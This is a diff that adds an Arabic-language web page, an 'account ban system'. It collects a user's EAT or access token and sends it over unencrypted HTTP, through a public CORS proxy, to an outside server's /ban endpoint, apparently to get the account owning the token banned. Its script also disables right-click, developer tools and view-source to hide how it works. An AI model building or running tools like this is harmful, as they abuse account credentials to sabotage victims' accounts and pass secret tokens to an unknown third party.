@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام حظر الحسابات | API Management</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #f8fafc;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 40% 80%, rgba(120, 219, 255, 0.1) 0%, transparent 40%);
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px;
+            border-radius: 20px;
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, #ff6b6b, #ffa500, #ffd93d, #6bcf7f, #4d96ff);
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #ff6b6b, #ffa500, #ffd93d);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #cbd5e1;
+            margin-bottom: 15px;
+        }
+        
+        .token-type-selector {
+            display: flex;
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 15px;
+            padding: 5px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .token-tab {
+            flex: 1;
+            text-align: center;
+            padding: 18px 10px;
+            cursor: pointer;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .token-tab.active {
+            background: linear-gradient(135deg, #4d96ff 0%, #6bcf7f 100%);
+            color: #0f172a;
+            box-shadow: 0 5px 15px rgba(77, 150, 255, 0.4);
+        }
+        
+        .token-tab:not(.active):hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .input-container {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .input-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .input-header i {
+            font-size: 1.8rem;
+            margin-left: 15px;
+            color: #4d96ff;
+        }
+        
+        .input-header h2 {
+            font-size: 1.8rem;
+        }
+        
+        .token-input {
+            width: 100%;
+            padding: 20px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #f8fafc;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .token-input:focus {
+            outline: none;
+            border-color: #4d96ff;
+            box-shadow: 0 0 0 3px rgba(77, 150, 255, 0.2);
+        }
+        
+        .token-input::placeholder {
+            color: #94a3b8;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffa500 100%);
+            color: #0f172a;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 107, 107, 0.4);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #f8fafc;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+        }
+        
+        .result-container {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: none;
+        }
+        
+        .result-container.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .result-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .result-header i {
+            font-size: 1.8rem;
+            margin-left: 15px;
+        }
+        
+        .success .result-header i {
+            color: #6bcf7f;
+        }
+        
+        .error .result-header i {
+            color: #ff6b6b;
+        }
+        
+        .warning .result-header i {
+            color: #ffa500;
+        }
+        
+        .result-content {
+            padding: 20px;
+            background: rgba(15, 23, 42, 0.8);
+            border-radius: 12px;
+            margin-top: 15px;
+            direction: rtl;
+            text-align: right;
+            line-height: 1.6;
+        }
+        
+        .result-details {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: #4d96ff;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .time-counter {
+            font-size: 1.1rem;
+            margin-top: 15px;
+            color: #ffd93d;
+        }
+        
+        .floating-icons {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            display: flex;
+            gap: 10px;
+            z-index: 100;
+        }
+        
+        .icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #f8fafc;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .icon:hover {
+            transform: translateY(-5px);
+            background: rgba(77, 150, 255, 0.8);
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #94a3b8;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .heart {
+            color: #ff6b6b;
+            animation: heartbeat 1.5s infinite;
+        }
+        
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        /* تأثيرات النص المتحرك */
+        .glitch {
+            position: relative;
+            display: inline-block;
+        }
+        
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .glitch::before {
+            left: 2px;
+            text-shadow: -2px 0 #ff6b6b;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+        
+        .glitch::after {
+            left: -2px;
+            text-shadow: -2px 0 #4d96ff;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim2 5s infinite linear alternate-reverse;
+        }
+        
+        @keyframes glitch-anim {
+            0% { clip: rect(42px, 9999px, 44px, 0); }
+            5% { clip: rect(12px, 9999px, 59px, 0); }
+            10% { clip: rect(48px, 9999px, 29px, 0); }
+            15% { clip: rect(42px, 9999px, 73px, 0); }
+            20% { clip: rect(63px, 9999px, 27px, 0); }
+            25% { clip: rect(34px, 9999px, 55px, 0); }
+            30% { clip: rect(86px, 9999px, 73px, 0); }
+            35% { clip: rect(20px, 9999px, 20px, 0); }
+            40% { clip: rect(26px, 9999px, 60px, 0); }
+            45% { clip: rect(25px, 9999px, 66px, 0); }
+            50% { clip: rect(57px, 9999px, 79px, 0); }
+            55% { clip: rect(5px, 9999px, 46px, 0); }
+            60% { clip: rect(82px, 9999px, 31px, 0); }
+            65% { clip: rect(54px, 9999px, 27px, 0); }
+            70% { clip: rect(28px, 9999px, 99px, 0); }
+            75% { clip: rect(45px, 9999px, 69px, 0); }
+            80% { clip: rect(23px, 9999px, 85px, 0); }
+            85% { clip: rect(54px, 9999px, 84px, 0); }
+            90% { clip: rect(45px, 9999px, 47px, 0); }
+            95% { clip: rect(37px, 9999px, 99px, 0); }
+            100% { clip: rect(4px, 9999px, 95px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+            0% { clip: rect(65px, 9999px, 100px, 0); }
+            5% { clip: rect(52px, 9999px, 74px, 0); }
+            10% { clip: rect(79px, 9999px, 85px, 0); }
+            15% { clip: rect(75px, 9999px, 5px, 0); }
+            20% { clip: rect(67px, 9999px, 61px, 0); }
+            25% { clip: rect(14px, 9999px, 79px, 0); }
+            30% { clip: rect(1px, 9999px, 66px, 0); }
+            35% { clip: rect(86px, 9999px, 30px, 0); }
+            40% { clip: rect(23px, 9999px, 98px, 0); }
+            45% { clip: rect(85px, 9999px, 72px, 0); }
+            50% { clip: rect(71px, 9999px, 75px, 0); }
+            55% { clip: rect(2px, 9999px, 48px, 0); }
+            60% { clip: rect(30px, 9999px, 16px, 0); }
+            65% { clip: rect(59px, 9999px, 50px, 0); }
+            70% { clip: rect(41px, 9999px, 62px, 0); }
+            75% { clip: rect(2px, 9999px, 82px, 0); }
+            80% { clip: rect(47px, 9999px, 73px, 0); }
+            85% { clip: rect(3px, 9999px, 27px, 0); }
+            90% { clip: rect(40px, 9999px, 86px, 0); }
+            95% { clip: rect(45px, 9999px, 72px, 0); }
+            100% { clip: rect(23px, 9999px, 49px, 0); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff6b6b, #ffa500);
+            width: 0%;
+            border-radius: 4px;
+            transition: width 1s linear;
+        }
+        
+        /* تصميم متجاوب */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px auto;
+                padding: 0 15px;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .token-tab {
+                font-size: 1rem;
+                padding: 15px 5px;
+            }
+            
+            .input-container {
+                padding: 20px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .api-url {
+                font-size: 0.8rem;
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1 class="glitch" data-text="نظام حظر الحسابات">نظام حظر الحسابات</h1>
+            <p class="subtitle">حظر الحساب عبر توكنات الوصول 🔥😉</p>
+        </header>
+        
+        <div class="token-type-selector">
+            <div class="token-tab active" id="eat-tab">
+                <i class="fas fa-key"></i>
+                <span>EAT Token</span>
+            </div>
+            <div class="token-tab" id="access-tab">
+                <i class="fas fa-user-lock"></i>
+                <span>Access Token</span>
+            </div>
+        </div>
+        
+        <div class="input-container">
+            <div class="input-header">
+                <i class="fas fa-key"></i>
+                <h2 id="input-title">أدخل EAT Token</h2>
+            </div>
+            
+            <input type="text" class="token-input" id="token-input" placeholder="أدخل الـ EAT Token هنا..." dir="ltr">
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="ban-btn">
+                    <i class="fas fa-ban"></i>
+                    <span>حظر الحساب</span>
+                </button>
+                <button class="btn btn-secondary" id="clear-btn">
+                    <i class="fas fa-broom"></i>
+                    <span>مسح الحقل</span>
+                </button>
+            </div>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري معالجة الطلب والاتصال بالخادم...</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <p class="time-counter" id="time-counter">الانتظار: <span id="seconds">0</span> ثانية من 30</p>
+            <p>يرجى الانتظار، هذه العملية قد تستغرق حتى 30 ثانية...</p>
+        </div>
+        
+        <div class="result-container" id="result-container">
+            <div class="result-header">
+                <i class="fas fa-check-circle"></i>
+                <h2 id="result-title">تمت العملية بنجاح</h2>
+            </div>
+            <div class="result-content" id="result-content">
+                <!-- سيتم تعبئة النتيجة هنا -->
+            </div>
+        </div>
+        
+        <footer>
+            <p>تم التصميم من قبل <span class="heart">OMAR</span> | جميع الحقوق محفوظة RLH55 ©2026</p>
+            <p>🔥😉</p>
+        </footer>
+    </div>
+    
+    <div class="floating-icons">
+        <div class="icon" id="info-icon" title="معلومات النظام">
+            <i class="fas fa-info-circle"></i>
+        </div>
+    </div>
+    
+    <script>
+        // عناصر DOM
+        const eatTab = document.getElementById('eat-tab');
+        const accessTab = document.getElementById('access-tab');
+        const inputTitle = document.getElementById('input-title');
+        const tokenInput = document.getElementById('token-input');
+        const banBtn = document.getElementById('ban-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const loading = document.getElementById('loading');
+        const resultContainer = document.getElementById('result-container');
+        const resultTitle = document.getElementById('result-title');
+        const resultContent = document.getElementById('result-content');
+        const progressFill = document.getElementById('progress-fill');
+        const timeCounter = document.getElementById('time-counter');
+        const secondsElement = document.getElementById('seconds');
+        const infoIcon = document.getElementById('info-icon');
+        
+        // متغيرات التحكم
+        let currentTokenType = 'eat';
+        let requestInProgress = false;
+        let countdownInterval;
+        let secondsElapsed = 0;
+        const maxWaitTime = 30; // 30 ثانية كحد أقصى
+        
+        // تبديل بين نوعي التوكن
+        eatTab.addEventListener('click', () => {
+            if (!requestInProgress) {
+                setActiveTab('eat');
+            }
+        });
+        
+        accessTab.addEventListener('click', () => {
+            if (!requestInProgress) {
+                setActiveTab('access');
+            }
+        });
+        
+        function setActiveTab(type) {
+            currentTokenType = type;
+            
+            // تحديث التبويبات
+            if (type === 'eat') {
+                eatTab.classList.add('active');
+                accessTab.classList.remove('active');
+                inputTitle.textContent = 'أدخل EAT Token';
+                tokenInput.placeholder = 'أدخل الـ EAT Token هنا...';
+            } else {
+                eatTab.classList.remove('active');
+                accessTab.classList.add('active');
+                inputTitle.textContent = 'أدخل Access Token';
+                tokenInput.placeholder = 'أدخل الـ Access Token هنا...';
+            }
+            
+            // مسح الحقل
+            tokenInput.value = '';
+        }
+        
+        // زر الحظر
+        banBtn.addEventListener('click', async () => {
+            if (requestInProgress) {
+                showResult('تحذير', 'هناك عملية قيد التنفيذ بالفعل، يرجى الانتظار...', 'warning');
+                return;
+            }
+            
+            const token = tokenInput.value.trim();
+            
+            if (!token) {
+                showResult('خطأ', 'يرجى إدخال التوكن المطلوب', 'error');
+                return;
+            }
+            
+            // بدء العملية
+            startRequest();
+            
+            try {
+                // بناء رابط API بناءً على نوع التوكن
+                let apiUrl;
+                if (currentTokenType === 'eat') {
+                    apiUrl = `http://api-ban-alliff-eat-and-access-token.spcfy.eu/ban?eat=${encodeURIComponent(token)}`;
+                } else {
+                    apiUrl = `http://api-ban-alliff-eat-and-access-token.spcfy.eu/ban?access_token=${encodeURIComponent(token)}`;
+                }
+                
+                // إرسال الطلب إلى API مع timeout طويل
+                await sendApiRequest(apiUrl, token);
+                
+            } catch (error) {
+                // إنهاء العملية
+                endRequest();
+                
+                // عرض رسالة الخطأ
+                showResult('خطأ', `فشل الاتصال بالخادم: ${error.message}`, 'error');
+            }
+        });
+        
+        // بدء عملية الطلب
+        function startRequest() {
+            requestInProgress = true;
+            secondsElapsed = 0;
+            
+            // تعطيل العناصر التفاعلية
+            banBtn.disabled = true;
+            tokenInput.disabled = true;
+            eatTab.style.pointerEvents = 'none';
+            accessTab.style.pointerEvents = 'none';
+            clearBtn.disabled = true;
+            
+            // إظهار مؤشر التحميل
+            loading.classList.add('show');
+            resultContainer.classList.remove('show');
+            
+            // إعادة تعيين شريط التقدم
+            progressFill.style.width = '0%';
+            updateTimeCounter();
+            
+            // بدء العد التنازلي
+            countdownInterval = setInterval(() => {
+                secondsElapsed++;
+                updateTimeCounter();
+                
+                // تحديث شريط التقدم
+                const progressPercent = (secondsElapsed / maxWaitTime) * 100;
+                progressFill.style.width = `${Math.min(progressPercent, 100)}%`;
+                
+                // إذا تجاوز الوقت المحدد
+                if (secondsElapsed >= maxWaitTime) {
+                    clearInterval(countdownInterval);
+                    
+                    // إنهاء العملية
+                    endRequest();
+                    
+                    // عرض رسالة تجاوز الوقت
+                    showResult('انتهاء الوقت', 'تجاوزت العملية الوقت المحدد (30 ثانية). يرجى المحاولة مرة أخرى.', 'error');
+                }
+            }, 1000);
+        }
+        
+        // إنهاء عملية الطلب
+        function endRequest() {
+            requestInProgress = false;
+            clearInterval(countdownInterval);
+            
+            // تمكين العناصر التفاعلية
+            banBtn.disabled = false;
+            tokenInput.disabled = false;
+            eatTab.style.pointerEvents = 'auto';
+            accessTab.style.pointerEvents = 'auto';
+            clearBtn.disabled = false;
+            
+            // إخفاء مؤشر التحميل
+            loading.classList.remove('show');
+        }
+        
+        // تحديث عداد الوقت
+        function updateTimeCounter() {
+            secondsElement.textContent = secondsElapsed;
+        }
+        
+        // إرسال طلب API حقيقي
+        async function sendApiRequest(apiUrl, token) {
+            try {
+                // إعداد وقت انتظار طويل (35 ثانية)
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 35000);
+                
+                // إرسال الطلب باستخدام fetch مع CORS proxy لتجنب مشاكل CORS
+                // نستخدم proxy لتجاوز مشاكل CORS في المتصفح
+                const proxyUrl = 'https://corsproxy.io/?';
+                const response = await fetch(proxyUrl + encodeURIComponent(apiUrl), {
+                    method: 'GET',
+                    signal: controller.signal,
+                    headers: {
+                        'Accept': 'application/json',
+                    }
+                });
+                
+                clearTimeout(timeoutId);
+                
+                // إنهاء العملية
+                endRequest();
+                
+                // معالجة الرد
+                if (response.ok) {
+                    try {
+                        const data = await response.json();
+                        showApiResult('تم الحظر بنجاح', data, 'success');
+                    } catch (jsonError) {
+                        // إذا لم يكن الرد JSON، نعرض نص الرد
+                        const text = await response.text();
+                        showApiResult('تم الحظر بنجاح', { 
+                            message: 'تم حظر الحساب بنجاح',
+                            rawResponse: text,
+                            status: response.status,
+                            statusText: response.statusText
+                        }, 'success');
+                    }
+                } else {
+                    showApiResult('خطأ في الرد', {
+                        message: 'فشل حظر الحساب',
+                        status: response.status,
+                        statusText: response.statusText
+                    }, 'error');
+                }
+                
+            } catch (error) {
+                // إنهاء العملية
+                endRequest();
+                
+                if (error.name === 'AbortError') {
+                    // تجاوز الوقت المحدد
+                    showResult('انتهاء الوقت', 'تجاوزت العملية الوقت المحدد. يرجى التحقق من اتصال الإنترنت والمحاولة مرة أخرى.', 'error');
+                } else {
+                    // خطأ آخر
+                    showResult('خطأ في الاتصال', `حدث خطأ أثناء الاتصال بالخادم: ${error.message}`, 'error');
+                }
+                throw error;
+            }
+        }
+        
+        // عرض نتيجة API
+        function showApiResult(title, data, type) {
+            let html = '';
+            
+            if (type === 'success') {
+                html += `
+                    <div style="margin-bottom: 15px;">
+                        <strong>الحالة:</strong> 
+                        <span style="color: #6bcf7f;">تم حظر الحساب بنجاح</span>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>نوع التوكن المستخدم:</strong> ${currentTokenType === 'eat' ? 'EAT Token' : 'Access Token'}
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>وقت المعالجة:</strong> ${secondsElapsed} ثانية
+                    </div>
+                `;
+            } else {
+                html += `
+                    <div style="margin-bottom: 15px;">
+                        <strong>الحالة:</strong> 
+                        <span style="color: #ff6b6b;">فشل حظر الحساب</span>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>نوع التوكن المستخدم:</strong> ${currentTokenType === 'eat' ? 'EAT Token' : 'Access Token'}
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>وقت المعالجة:</strong> ${secondsElapsed} ثانية
+                    </div>
+                `;
+            }
+            
+            // عرض تفاصيل الرد من API
+            if (data) {
+                html += `
+                    <div style="margin-top: 20px;">
+                        <strong>تفاصيل الرد من الخادم:</strong>
+                        <div class="result-details">${JSON.stringify(data, null, 2)}</div>
+                    </div>
+                `;
+            }
+            
+            html += `
+                <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1);">
+                    <strong>ملاحظة:</strong> تم الاتصال بالخادم وانتظار الرد لمدة ${secondsElapsed} ثانية.
+                </div>
+            `;
+            
+            showResult(title, html, type);
+        }
+        
+        // عرض النتيجة
+        function showResult(title, content, type) {
+            resultTitle.textContent = title;
+            resultContent.innerHTML = content;
+            
+            // تحديث الألوان بناءً على النوع
+            resultContainer.className = 'result-container show ' + type;
+            
+            // إضافة الأيقونة المناسبة
+            const icon = resultContainer.querySelector('.result-header i');
+            if (type === 'success') {
+                icon.className = 'fas fa-check-circle';
+            } else if (type === 'error') {
+                icon.className = 'fas fa-exclamation-circle';
+            } else if (type === 'warning') {
+                icon.className = 'fas fa-exclamation-triangle';
+            }
+        }
+        
+        // زر المسح
+        clearBtn.addEventListener('click', () => {
+            if (!requestInProgress) {
+                tokenInput.value = '';
+                tokenInput.focus();
+                resultContainer.classList.remove('show');
+            }
+        });
+        
+        // معلومات النظام
+        infoIcon.addEventListener('click', () => {
+            const infoContent = `
+                <div style="line-height: 1.6;">
+                    <h3 style="margin-bottom: 15px; color: #4d96ff;">معلومات النظام</h3>
+                    <div style="margin-bottom: 15px;">
+                        <strong>نظام حظر الحسابات:</strong> نظام حظر الحسابات عبر توكنات الوصول الخاصة بالحساب .
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>أنواع التوكن المدعومة:</strong>
+                        <ul style="padding-right: 20px; margin-top: 8px;">
+                            <li>EAT Token</li>
+                            <li>Access Token</li>
+                        </ul>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>طريقة الاستخدام:</strong>
+                        <ol style="padding-right: 20px; margin-top: 8px;">
+                            <li>اختر نوع التوكن من الأعلى</li>
+                            <li>أدخل التوكن في الحقل المخصص</li>
+                            <li>انقر على زر "حظر الحساب"</li>
+                            <li>انتظر حتى 30 ثانية للحصول على الرد</li>
+                        </ol>
+                    </div>
+                </div>
+            `;
+            
+            showResult('معلومات النظام', infoContent, 'success');
+        });
+        
+        // السماح بالضغط على Enter لإرسال الطلب
+        tokenInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && !requestInProgress) {
+                banBtn.click();
+            }
+        });
+        
+        // تعيين التركيز على حقل الإدخال عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            tokenInput.focus();
+        });
+        
+        // منع نسخ الروابط
+        document.addEventListener('contextmenu', function(e) {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                return;
+            }
+            e.preventDefault();
+        });
+        
+        // منع فحص الكود
+        document.addEventListener('keydown', function(e) {
+            // منع F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+                showResult('تحذير أمني', 'تم تعطيل فحص الصفحة لأسباب أمنية.', 'warning');
+            }
+            
+            // منع Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+                e.preventDefault();
+                showResult('تحذير أمني', 'تم تعطيل فحص الصفحة لأسباب أمنية.', 'warning');
+            }
+            
+            if (e.ctrlKey && e.key === 'u') {
+                e.preventDefault();
+                showResult('تحذير أمني', 'تم تعطيل عرض مصدر الصفحة لأسباب أمنية.', 'warning');
+            }
+        });
+    </script>
+</body>
+</html>
